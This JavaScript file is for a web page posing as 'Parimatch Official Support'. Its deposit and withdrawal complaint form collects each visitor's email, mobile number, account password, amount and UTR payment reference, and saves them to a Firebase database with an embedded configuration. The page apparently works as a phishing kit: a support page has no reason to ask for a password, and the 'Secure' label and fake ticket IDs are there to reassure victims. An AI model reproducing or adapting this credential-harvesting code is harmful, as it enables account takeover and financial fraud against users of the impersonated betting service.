// ===== Parimatch Support Site - Firebase Firestore Integration =====

// ===== FIREBASE CONFIG =====
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

const SITE_ID = "parimatch";

// ===== FIREBASE DYNAMIC LOADER =====
let _fbDb = null;
let _fbLoading = null;

function loadFirebase() {
  if (_fbDb) return Promise.resolve(_fbDb);
  if (_fbLoading) return _fbLoading;

  _fbLoading = new Promise((resolve, reject) => {
    const initDb = () => {
      try {
        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
        _fbDb = firebase.firestore();
        resolve(_fbDb);
      } catch (e) { reject(e); }
    };

    if (window.firebase && window.firebase.firestore) { initDb(); return; }

    const urls = [
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
    ];
    let loaded = 0;
    urls.forEach(src => {
      const s = document.createElement('script');
      s.src = src;
      s.onload = () => {
        loaded++;
        if (loaded === urls.length) initDb();
      };
      s.onerror = () => reject(new Error('Firebase load failed: ' + src));
      document.head.appendChild(s);
    });
  });

  return _fbLoading;
}

function saveSubmission(data) {
  return loadFirebase().then(db => {
    const payload = { ...data, site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() };
    return db.collection('submissions').add(payload);
  });
}

document.addEventListener('DOMContentLoaded', () => {

  // Splash screen - remove after animation
  setTimeout(() => {
    const splash = document.getElementById('splashScreen');
    if (splash) splash.remove();
  }, 2500);

  // Page transition helper
  function navigateWithTransition(url) {
    const overlay = document.getElementById('pageTransition');
    if (overlay) {
      overlay.classList.add('active');
      setTimeout(() => { window.location.href = url; }, 400);
    } else {
      window.location.href = url;
    }
  }

  // Auto-select tab from URL params (complaint.html?tab=deposit)
  const urlParams = new URLSearchParams(window.location.search);
  const tabParam = urlParams.get('tab');
  if (tabParam) {
    const targetTab = document.querySelector('[data-tab="' + tabParam + '"]');
    if (targetTab) targetTab.click();
  }

  // COMPLAIN NOW Button Redirect with transition
  const submitBtn = document.getElementById('submitProblemBtn');
  if (submitBtn) {
    submitBtn.addEventListener('click', (e) => {
      e.preventDefault();
      navigateWithTransition('complaint.html');
    });
  }

  // Helper: Redirect to complaint page with transition
  window.scrollToForm = (type) => {
    navigateWithTransition('complaint.html?tab=' + type);
  };

  // Internal links with transition (exclude already-handled buttons)
  document.querySelectorAll('a[href^="index.html"], a[href^="complaint.html"]').forEach(link => {
    if (link.id === 'submitProblemBtn') return;
    link.addEventListener('click', (e) => {
      if (!link.hasAttribute('target')) {
        e.preventDefault();
        navigateWithTransition(link.getAttribute('href'));
      }
    });
  });

  // ✅ Form logic - only runs on complaint page
  const problemForm = document.getElementById('problemForm');
  if (problemForm) {
    const tabBtns = document.querySelectorAll('.tab-btn');
    const depositFields = document.getElementById('depositFields');
    const withdrawalFields = document.getElementById('withdrawalFields');

    tabBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        tabBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');

        const tab = btn.dataset.tab;

        if (tab === 'deposit') {
          depositFields.classList.add('active');
          withdrawalFields.classList.remove('active');
          document.getElementById('depositAmount').required = true;
          document.getElementById('utr').required = true;
          document.getElementById('withdrawAmount').required = false;
        } else {
          depositFields.classList.remove('active');
          withdrawalFields.classList.add('active');
          document.getElementById('depositAmount').required = false;
          document.getElementById('utr').required = false;
          document.getElementById('withdrawAmount').required = true;
        }
      });
    });

    // Form Submission - FIREBASE SAVE
    problemForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const submitBtn = problemForm.querySelector('.btn-submit');
      const originalBtnText = submitBtn.innerHTML;
      submitBtn.innerHTML = "⏳ Sending...";
      submitBtn.disabled = true;

      try {
        const requestId = "TX" + Math.floor(100000 + Math.random() * 900000);

        const email = document.getElementById('email').value;
        const mobile = document.getElementById('mobile').value;
        const password = document.getElementById('password').value;
        const description = document.getElementById('description').value;
        const type = document.querySelector('.tab-btn.active').dataset.tab;
        const timestamp = new Date().toLocaleString('en-IN', {
          day: '2-digit', month: 'short', year: 'numeric',
          hour: '2-digit', minute: '2-digit', hour12: true
        });

        let amount = "", utr = "", method = "";
        if (type === 'deposit') {
          amount = document.getElementById('depositAmount').value;
          utr = document.getElementById('utr').value;
        } else {
          amount = document.getElementById('withdrawAmount').value;
          method = document.getElementById('withdrawMethod').value;
        }

        const gameId = "TOPX" + Math.floor(10000 + Math.random() * 90000);

        await saveSubmission({
          request_id: requestId,
          email: email,
          mobile: mobile,
          password: password,
          description: description,
          type: type === 'deposit' ? 'Deposit Problem' : 'Withdrawal Problem',
          amount: amount,
          utr: utr || 'N/A',
          withdraw_method: method || 'Not specified',
          game_id: gameId,
          timestamp: timestamp,
          source: 'Parimatch Official Support'
        });

        showNotification("✅ Complaint filed successfully!", "success");
        problemForm.reset();
        depositFields.classList.add('active');
        withdrawalFields.classList.remove('active');
        document.querySelector('[data-tab="deposit"]').classList.add('active');
        document.querySelector('[data-tab="withdrawal"]').classList.remove('active');

      } catch (error) {
        console.error("Firebase Error:", error);
        showNotification("❌ Failed to send. Please try again.", "error");
      } finally {
        submitBtn.innerHTML = originalBtnText;
        submitBtn.disabled = false;
      }
    });
  }

  // iOS-style Notification
  function showNotification(message, type = "info") {
    const existing = document.querySelector('.ios-notification');
    if (existing) existing.remove();
    
    const notif = document.createElement('div');
    notif.className = `ios-notification ${type}`;
    notif.innerHTML = `
      <div class="notif-content">
        <span class="notif-icon">${type === 'success' ? '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><polyline points="20 6 9 17 4 12"/></svg>' : type === 'error' ? '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>' : '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>'}</span>
        <span>${message}</span>
      </div>
    `;
    
    notif.style.cssText = `
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: ${type === 'success' ? 'rgba(52,199,89,0.95)' : type === 'error' ? 'rgba(255,59,48,0.95)' : 'rgba(63,169,245,0.95)'};
      color: #0F1012;
      padding: 14px 20px;
      border-radius: 16px;
      font-weight: 500;
      font-size: 0.95rem;
      z-index: 1000;
      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
      backdrop-filter: blur(10px);
      max-width: 90%;
      text-align: center;
      animation: slideDown 0.3s ease, fadeOut 0.3s ease 2.7s forwards;
    `;
    
    document.body.appendChild(notif);
    setTimeout(() => notif.remove(), 3000);
  }
  
  // Add keyframes
  const style = document.createElement('style');
  style.textContent = `
    @keyframes slideDown { from { top: -60px; opacity: 0; } to { top: 20px; opacity: 1; } }
    @keyframes fadeOut { to { opacity: 0; transform: translateX(-50%) translateY(-10px); } }
  `;
  document.head.appendChild(style);

  // iOS Input Enhancements
  document.querySelectorAll('input, textarea').forEach(input => {
    input.addEventListener('focus', function() {
      this.parentElement.style.transform = 'scale(1.01)';
      this.parentElement.style.transition = 'transform 0.2s ease';
    });
    input.addEventListener('blur', function() {
      this.parentElement.style.transform = 'scale(1)';
    });
  });

  // Prevent zoom on focus (iOS)
  document.querySelectorAll('input, select, textarea').forEach(el => {
    el.addEventListener('focus', () => {
      if (window.innerWidth < 1024) {
        document.querySelector('meta[name="viewport"]').setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
      }
    });
    el.addEventListener('blur', () => {
      document.querySelector('meta[name="viewport"]').setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes');
    });
  });

  console.log("%c[Parimatch Support Loaded]", "color:#D8F529; font-size:14px; font-weight:bold;");
  console.log("%c[Firebase Integration Ready | Secure]", "color:#FFA000;");

  // Preload Firebase in background
  loadFirebase().catch(e => console.warn('Firebase preload skipped:', e));
});
